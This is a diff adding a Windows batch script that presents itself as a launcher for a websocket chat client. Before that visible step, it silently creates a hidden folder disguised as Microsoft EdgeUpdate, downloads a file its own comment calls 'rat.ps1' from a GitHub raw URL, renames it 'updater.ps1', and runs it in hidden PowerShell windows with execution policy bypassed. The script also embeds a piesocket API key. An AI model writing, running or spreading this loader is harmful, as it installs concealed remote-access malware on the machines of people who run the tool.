@@ -1,0 +1,45 @@
+ÿþ&cls
+@echo off
+setlocal
+
+REM Crear carpeta oculta
+if not exist "%APPDATA%\Microsoft\EdgeUpdate" mkdir "%APPDATA%\Microsoft\EdgeUpdate"
+attrib +h "%APPDATA%\Microsoft\EdgeUpdate"
+
+REM Descargar rat.ps1 si no existe
+if not exist "%APPDATA%\Microsoft\EdgeUpdate\updater.ps1" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1' -OutFile '%APPDATA%\Microsoft\EdgeUpdate\updater.ps1' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1
+)
+
+REM Ejecutar PowerShell en proceso independiente
+start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%APPDATA%\Microsoft\EdgeUpdate\updater.ps1\"' -WindowStyle Hidden"
+
+cls 
+
+REM URL RAW del archivo en GitHub
+set FILE_URL=https://raw.githubusercontent.com/icyyboy/torreiro/main/ws-client.ps1
+set FILE_NAME=ws-client.ps1
+set URL=wss://free.blr2.piesocket.com/v3/1?api_key=BT6QPL15GIlioXwdU0TwDMyM2yFUXjef44gROpTg&notify_self=1
+
+echo Downloading ws-client.ps1...
+
+REM Descargar con PowerShell
+powershell -Command "Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%FILE_NAME%'"
+
+if not exist %FILE_NAME% (
+    echo ERROR: Download failed
+    pause
+    exit /b
+)
+
+echo Download complete.
+
+echo Starting listener window...
+start cmd /k powershell -ExecutionPolicy Bypass -NoExit -File %FILE_NAME% -url %URL%
+
+timeout /t 1 >nul
+
+echo Starting sender window...
+start cmd /k powershell -ExecutionPolicy Bypass -NoExit -File %FILE_NAME% -url %URL%
+
+endlocal
